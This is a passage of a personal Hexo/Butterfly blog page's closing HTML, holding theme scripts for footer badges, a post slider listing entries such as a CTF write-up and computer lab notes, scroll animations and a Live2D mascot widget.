    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v6.2.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.3.1" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站采用多线部署，主线路托管于Vercel" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://dashboard.4everland.org/" style="margin-inline:5px" data-title="本站采用多线部署，备用线路托管于4EVERLAND" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
    console.log('已挂载butterfly_footer_beautify')
    parent_div_git.insertAdjacentHTML("beforeend",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_footer_beautify_injector_config();
  }
  else if (epage === cpage){
    butterfly_footer_beautify_injector_config();
  }
  </script><script async src="/js/runtime.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/10/12/wp/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="img/top_img/9.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-10-12</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/10/12/wp/&quot;);" href="javascript:void(0);" alt="">CTF's wp</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/10/12/wp/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/10/10/Summary/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="img/top_img/5.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-10-10</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/10/10/Summary/&quot;);" href="javascript:void(0);" alt="">知识图谱</a><div class="blog-slider__text">知识图谱工作总结</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/10/10/Summary/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/10/06/2024-10-6-mysql/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="img/top_img/3.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-10-06</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/10/06/2024-10-6-mysql/&quot;);" href="javascript:void(0);" alt="">数据库系统概论实验（一）</a><div class="blog-slider__text">数据库系统实验</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/10/06/2024-10-6-mysql/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/10/07/2024-10-7-network/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="img/top_img/4.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-10-07</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/10/07/2024-10-7-network/&quot;);" href="javascript:void(0);" alt="">计算机网络实验</a><div class="blog-slider__text">tftp套接字编程</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/10/07/2024-10-7-network/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/10/01/2024-10-3-firstpage/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="img/top_img/1.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-10-01</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/10/01/2024-10-3-firstpage/&quot;);" href="javascript:void(0);" alt="">Hello Blog</a><div class="blog-slider__text">博客简介</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/10/01/2024-10-3-firstpage/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/09/30/2024-10-3-list/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="img/top_img/2.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-09-30</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/09/30/2024-10-3-list/&quot;);" href="javascript:void(0);" alt="">国庆</a><div class="blog-slider__text">国庆安排</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/09/30/2024-10-3-list/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__bounceInLeft');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '500ms');
    arr[i].setAttribute('data-wow-offset', '100');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('pagination');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__bounceInLeft');
    arr[i].setAttribute('data-wow-duration', '');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>